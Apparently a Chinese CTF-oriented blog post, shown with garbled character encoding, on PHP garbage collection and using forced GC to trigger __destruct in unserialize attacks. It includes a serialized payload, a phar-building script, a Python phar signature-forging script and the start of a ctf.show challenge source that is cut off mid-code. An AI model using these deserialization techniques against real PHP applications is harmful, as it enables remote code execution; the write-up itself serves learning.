<p>ç®€å•ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨çš„æ—¶å€™ å°±ä¼šè¢«<code>GC</code>æœºåˆ¶å›æ”¶ åœ¨è¢«å›æ”¶çš„åŒæ—¶ ä¼šè§¦å‘<code>__destruct()</code>æ–¹æ³• è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹~</p>
<p><code>refcount</code>å˜é‡å¼•ç”¨è®¡æ•°  	<code>is_ref</code>æ˜¯å¦è¢«å¼•ç”¨ boolå€¼</p>
<p>è°ƒè¯•å·¥å…·<a class="link" href="http://xdebug.org/"  target="_blank" rel="noopener"
    >Xdebug - Debugger and Profiler Tool for PHP</a>  å¦‚æœæ˜¯å°çš®é¢æ¿çš„è¯ç›´æ¥ <strong>phpæ‰©å±•</strong>å¼€å¯å°±è¡Œäº†</p>
<p>PHPä¸åŒç‰ˆæœ¬ä¸‹<strong>GCæœºåˆ¶</strong>æœ‰å˜åŒ–   ä»¥ä¸‹ç¯å¢ƒä¸º<code>PHP 5.4.45</code>æ¨¡æ‹Ÿ</p>
<h2 id="php-æ·±æµ…æ‹·è´">PHP æ·±æµ…æ‹·è´</h2>
<blockquote>
<p>åœ¨ PHP ä¸­å¼•ç”¨æ„å‘³ç€ç”¨ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚è¿™å¹¶ä¸åƒ C çš„æŒ‡é’ˆï¼šä¾‹å¦‚ä½ ä¸èƒ½å¯¹ä»–ä»¬åšæŒ‡é’ˆè¿ç®—ï¼Œä»–ä»¬å¹¶ä¸æ˜¯å®é™…çš„å†…å­˜åœ°å€ã€‚æ›¿ä»£çš„æ˜¯ï¼Œå¼•ç”¨æ˜¯ç¬¦å·è¡¨åˆ«åã€‚æ³¨æ„åœ¨PHP ä¸­ï¼Œå˜é‡åå’Œå˜é‡å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› æ­¤åŒæ ·çš„å†…å®¹å¯ä»¥æœ‰ä¸åŒçš„åå­—ã€‚æœ€æ¥è¿‘çš„æ¯”å–»æ˜¯ Unix çš„æ–‡ä»¶åå’Œæ–‡ä»¶æœ¬èº«â€”â€”å˜é‡åæ˜¯ç›®å½•æ¡ç›®ï¼Œè€Œå˜é‡å†…å®¹åˆ™æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¼•ç”¨å¯ä»¥è¢«çœ‹ä½œæ˜¯ Unix æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç¡¬é“¾æ¥</p>
</blockquote>
<p><strong>å¼•ç”¨å–æ¶ˆ</strong> åˆ™éœ€è¦ä½¿ç”¨<code>unset()</code>åªæ˜¯æ–­å¼€äº†å˜é‡åå’Œå˜é‡å†…å®¹ä¹‹é—´çš„ç»‘å®š,å¹¶ä¸æ˜¯è¯´å˜é‡å†…å®¹è¢«é”€æ¯äº†</p>
<h3 id="æ·±æ‹·è´">æ·±æ‹·è´ï¼š</h3>
<blockquote>
<p>èµ‹å€¼æ—¶å€¼å®Œå…¨å¤åˆ¶å¯¹å…¶ä¸­ä¸€ä¸ªä½œå‡ºæ”¹å˜ï¼Œä¸ä¼šå½±å“å¦ä¸€ä¸ª</p>
<p>åœ¨PHP5ä»¥ä¸Šï¼Œå¯¹è±¡çš„ = èµ‹å€¼å’Œä¼ é€’éƒ½æ˜¯å¼•ç”¨(æµ…)ã€‚phpæä¾›äº†<code>clone</code>å‡½æ•°å®ç°æ‹·è´å‰¯æœ¬</p>
</blockquote>
<p>ç›´æ¥æŠŠ<code>$a</code>èµ‹å€¼ç»™<code>$b</code>ä¹‹åï¼Œ<code>$b</code>ä¿®æ”¹å¹¶ä¸ä¼šå¯¹<code>$a</code>ä»»ä½•å½±å“ï¼Œå¯ä»¥çœ‹åˆ°2æ¬¡è¾“å‡ºéƒ½æ˜¯<code>main1o</code></p>
<p>å˜é‡<code>$a</code>å¼•ç”¨è®¡æ•°å€¼<code>refcount</code>ä¹Ÿä¸º1ï¼Œå¹¶ä¸”<code>is_ref</code>ä¹Ÿæ˜¯false</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657.png"
	width="602"
	height="374"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120132330657_hu1de70d15941b9226eeb9f95b24893657_28105_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120132330657"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="386px"
	
></p>
<p>å¯¹è±¡çš„æ·±æ‹·è´  ç”¨cloneå‡½æ•°æ‹·è´å‡ºä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œä¿®æ”¹è¯¥å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹å¯¹è±¡</p>
<p>ä¿®æ”¹<code>$a</code>å¯¹è±¡ï¼Œåªä¼šå¯¹<code>$b</code>å¯¹è±¡æœ‰å½±å“ï¼Œå¹¶ä¸ä¼šå¯¹<code>$c</code>å¯¹è±¡æœ‰ä»»ä½•å½±å“</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985.png"
	width="438"
	height="342"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120134851985_hu203ac5e83798495d20a8550afc078184_23242_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120134851985"
	
	
		class="gallery-image" 
		data-flex-grow="128"
		data-flex-basis="307px"
	
></p>
<h3 id="æµ…æ‹·è´">æµ…æ‹·è´ï¼š</h3>
<blockquote>
<p>èµ‹å€¼æ—¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œç›¸å½“äºå–äº†ä¸€ä¸ªåˆ«åã€‚å¯¹å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œä¼šå½±å“å¦ä¸€ä¸ª</p>
</blockquote>
<p>ä½¿ç”¨<code>&amp;</code>æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨å˜é‡ï¼Œæˆ‘ä»¬å¯¹<code>$a</code>è¿›è¡Œä¿®æ”¹ ç›´æ¥å½±å“äº†<code>$b</code> â€œmain1oâ€ &ndash;&gt; &ldquo;ikun&rdquo;</p>
<p>å°±æ˜¯<code>$a</code> å’Œ<code>$b</code>éƒ½æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€å—åœ°å€</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873.png"
	width="607"
	height="354"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120140131873_hu1e41287177b147b4aad1be9296cba66c_28204_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120140131873"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="411px"
	
></p>
<h2 id="ååºåˆ—åŒ–ä¸­çš„ä½œç”¨">ååºåˆ—åŒ–ä¸­çš„ä½œç”¨</h2>
<p>è¡¥å……ï¼š</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>æ–¹æ³•å</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td>__construct</td>
<td>æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼</td>
</tr>
<tr>
<td>__destruct</td>
<td>ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸º<code>null</code>)æˆ–è€…<code>ç¨‹åºé€€å‡º</code>æ—¶è‡ªåŠ¨è°ƒç”¨ å³å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼æ‰‹åŠ¨é”€æ¯ä¸º<code>unset(Object)</code></td>
</tr>
</tbody>
</table></div>
<p>æ‰‹åŠ¨é”€æ¯å¯¹è±¡<code>unset()</code>è§¦å‘äº†<code>$a</code>å¯¹è±¡ä¸­çš„ææ„å‡½æ•°ã€‚æå‰è¾“å‡ºäº† 1__destruct()</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001.png"
	width="606"
	height="629"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120144320001_hu061b4060c96bd52b782080f2df917f77_54584_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120144320001"
	
	
		class="gallery-image" 
		data-flex-grow="96"
		data-flex-basis="231px"
	
></p>
<p>è¿˜æœ‰å¯¹è±¡å¼•ç”¨è¢«è§†ä¸ºnull ä¹Ÿä¼šè§¦å‘ï¼Œè¿™é‡Œä¸¾ä¸ªä¾‹å­</p>
<p>å˜é‡èµ‹å€¼éƒ½æ˜¯ <strong>è‡ªå³å‘å·¦</strong> æ‰€ä»¥æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ 0 è¦†ç›–äº†å¯¹è±¡å¤±å»äº†å¼•ç”¨ï¼Œé‚£ä¹ˆå°±æ»¡è¶³è§¦å‘GCå›æ”¶äº†ã€‚å³è§¦å‘<code>__destruct</code></p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356.png"
	width="612"
	height="648"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120150717356_hucf92e2ee1d8bf9e6495b2367ce13cb08_56674_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120150717356"
	
	
		class="gallery-image" 
		data-flex-grow="94"
		data-flex-basis="226px"
	
></p>
<h3 id="demo-">Demo :</h3>
<p>æœ€åä¸€è¡Œä»£ç é”™è¯¯æŠ›å‡ºå¼‚å¸¸ï¼Œæ˜¯æ— æ³•è§¦å‘<code>__destruct </code>  éœ€è¦æ­£å¸¸ç»“æŸç¨‹åº</p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šé¢ä»‹ç»çš„è§¦å‘<code>GCæœºåˆ¶</code> æ¥ç»•è¿‡ã€‚è¿™é‡Œå°†ç¬¬äºŒä¸ªç´¢å¼•ç½®ç©ºã€‚</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396.png"
	width="554"
	height="406"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120152723396_hu0dee8c5d562011d8ed2c16bb1351a20a_30909_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120152723396"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="327px"
	
></p>
<p><strong>Payloadï¼š</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;B&#34;</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424.png"
	width="555"
	height="373"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160431424_hue86eeee58af33985c513547bfcb49471_29764_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120160431424"
	
	
		class="gallery-image" 
		data-flex-grow="148"
		data-flex-basis="357px"
	
> <img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716.png"
	width="581"
	height="371"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120160507716_hu13f5293e9690aaac09b5611cc1b64a54_35743_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120160507716"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="375px"
	
></p>
<h3 id="gc-pharååºåˆ—åŒ–åˆ©ç”¨">GC Pharååºåˆ—åŒ–åˆ©ç”¨:</h3>
<p>Pharååºåˆ—åŒ–ï¼Œä½¿ç”¨<code>file_get_contents()</code>å‡½æ•°ï¼Œå…ˆæŒ‰ç…§æ­£å¸¸æµç¨‹å»ç”Ÿæˆä¸€ä¸ª<code>.phar</code>æ–‡ä»¶</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572.png"
	width="483"
	height="387"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120161313572_huf4e96f746b280f49a1bfd48cbf553c4a_31940_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120161313572"
	
	
		class="gallery-image" 
		data-flex-grow="124"
		data-flex-basis="299px"
	
></p>
<p>ç”Ÿæˆæ­¥éª¤å°±ä¸ä¸€ä¸€ç´¯è¿°äº†ï¼Œæ³¨æ„éœ€è¦å¼€å¯<code>php.ini</code>ä¸­çš„<code>phar.readonly = Off</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span><span class="p">{</span><span class="k">public</span> <span class="nv">$code</span><span class="o">=</span> <span class="s2">&#34;phpinfo();&#34;</span><span class="p">;}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;1.phar&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºç”Ÿæˆçš„pharæ–‡ä»¶ä¸èƒ½éšæ„ä¿®æ”¹ï¼Œå¦åˆ™ç­¾åä¸åŒ¹é…ã€‚å…ˆæŒ‰ç…§åŸæ¥çš„æ–¹æ³•ä¿®æ”¹æ•°ç»„å€¼ï¼Œç„¶ååœ¨é€šè¿‡è„šæœ¬è¿›è¡Œä¼ªé€ ç­¾åã€‚</p>
<p>ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ å¯ä»¥çœ‹åˆ°<code>i:1</code>ä¿®æ”¹ä¸º<code>i:0</code>  ä¿å­˜</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824.png"
	width="629"
	height="270"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162413824_hu8afac5acadbb255c1b8dfe0e9a37f03d_56564_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120162413824"
	
	
		class="gallery-image" 
		data-flex-grow="232"
		data-flex-basis="559px"
	
></p>
<p>exp.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gzip</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;1.phar&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">f</span><span class="p">[:</span><span class="o">-</span><span class="mi">28</span><span class="p">]</span> 
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="o">-</span><span class="mi">8</span><span class="p">:]</span> 
</span></span><span class="line"><span class="cl"><span class="n">newf</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span> <span class="o">+</span> <span class="n">h</span>
</span></span><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;2.phar&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">newf</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ç€ä½¿ç”¨<code>phar://</code> ä¼ªåè®®åŒ…å«2.pharè¿™ä¸ªæ–‡ä»¶å³å¯,æˆåŠŸæ‰§è¡Œäº†</p>
<p><img src="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285.png"
	width="1064"
	height="633"
	srcset="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_480x0_resize_box_3.png 480w, /p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/image-20221120162937285_hu6969d44455ec07431eff7511fb2167c9_63804_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="image-20221120162937285"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="403px"
	
></p>
<h2 id="ä¾‹é¢˜">ä¾‹é¢˜ï¼š</h2>
<blockquote>
<p>[ctf.show](<a class="link" href="https://ctf.show/challenges#easy"  target="_blank" rel="noopener"
    >https://ctf.show/challenges#easy</a> unserialize-1806)</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;./HappyYear.php&#34;</span><span class="p">);</span>				<span class="c1">// flagæ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">class</span> <span class="nc">one</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$object</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">MeMeMe</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">array_walk</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="k">function</span><span class="p">(</span><span class="nv">$fn</span><span class="p">,</span> <span class="nv">$prev</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$fn</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;Happy_func&#34;</span> <span class="o">&amp;&amp;</span> <span class="nv">$prev</span> <span class="o">===</span> <span class="s2">&#34;year_parm&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$talk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$talk</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">global</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">object</span><span class="o">-&gt;</span><span class="na">string</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">second</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="k">function</span> <span class="nf">addMe</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Wow you have sovled&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">;</span> 		<span class="c1">// å­—ç¬¦å’Œå¯¹è±¡è¿›è¡Œæ‹¼æ¥ å¯ä»¥è§¦å‘one()::__toString()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
